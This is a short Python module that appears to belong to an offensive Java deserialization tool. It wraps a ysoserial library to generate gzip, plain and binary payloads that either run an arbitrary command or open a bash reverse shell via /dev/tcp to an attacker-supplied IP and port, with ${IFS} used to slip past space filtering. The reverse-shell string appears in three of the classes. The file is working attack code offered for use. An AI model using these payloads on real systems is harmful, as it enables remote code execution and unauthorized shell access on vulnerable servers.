from src.libs.lib import Payload_Bin, Payload_Gzip, Payload, ysoserial
import argparse
from interface.ui.colors import VERDE, BRANCO, AMARELO, CLARO, VERMELHO, RED1, BLUE



class Obj_Gzip(Payload_Gzip):
    def __init__(self, command):
        self.command = command
        Payload_Gzip(command)

class Obj_Normal(Payload):
    def __init__(self, command):
        self.command = command
        Payload(command)

class Reverse_Gzip(Payload_Gzip):
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        reverse = '/bin/bash -c /bin/bash${IFS}-i>&/dev/tcp/' + ip + '/' + port + '<&1'
        Payload_Gzip(reverse)

class Reverse_Normal(Payload):
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        reverse = '/bin/bash -c /bin/bash${IFS}-i>&/dev/tcp/' + ip + '/' + port + '<&1'
        Payload(reverse)

class Binary_cmd(Payload_Bin):
    def __init__(self, command):
        self.command = command
        Payload_Bin(command)

class Binary_rev(Payload_Bin):
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        reverse = '/bin/bash -c /bin/bash${IFS}-i>&/dev/tcp/' + ip + '/' + port + '<&1'
        Payload_Bin(reverse)
